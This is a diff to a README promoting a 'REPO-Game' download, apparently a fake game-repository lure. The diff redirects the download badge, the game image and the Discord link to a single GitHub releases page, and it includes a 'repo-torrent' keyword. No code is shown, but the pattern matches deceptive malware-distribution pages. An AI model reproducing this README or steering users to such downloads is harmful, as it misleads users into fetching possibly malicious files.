@@ -31,7 +31,7 @@ Are you ready to dive into the spine-chilling world of "REPO-Game"? Get ready to
 - repo-torrent
 
 ### Release Link:
-[![Download Game](https://img.shields.io/badge/Download%20Game-Click%20Here-orange)](https://github.com/repo/releases/9246/App.zip)
+[![Download Game](https://github.com/cohen29/REPO-Game/releases%20Game-Click%20Here-orange)](https://github.com/cohen29/REPO-Game/releases)
 
 ### Overview:
 Dive into the heart-pounding world of "REPO-Game" where every move you make could mean the difference between survival and peril. Work together with your friends to uncover the hidden secrets of the game, all while facing terrifying challenges and heart-stopping encounters.
@@ -55,10 +55,10 @@ For more information about the game, additional downloads, or updates, make sure
 ### Get Ready to Conquer Your Fears:
 Are you prepared to face the challenges that await you in "REPO-Game"? Gather your friends, brace yourself for the unknown, and step into a world where terror and excitement collide. Download the game now and start your adventure today!
 
-![Game Image](https://example.com/game-image.png)
+![Game Image](https://github.com/cohen29/REPO-Game/releases)
 
 ### Join the Community:
-Connect with other players, share tips and tricks, and stay up to date on the latest news by joining our community on [Discord](https://discord.gg/repo-game)!
+Connect with other players, share tips and tricks, and stay up to date on the latest news by joining our community on [Discord](https://github.com/cohen29/REPO-Game/releases)!
 
 ### Start Your Adventure Now:
 Download the game and dive into the heart-pounding world of "REPO-Game". Are you ready to take on the challenge?
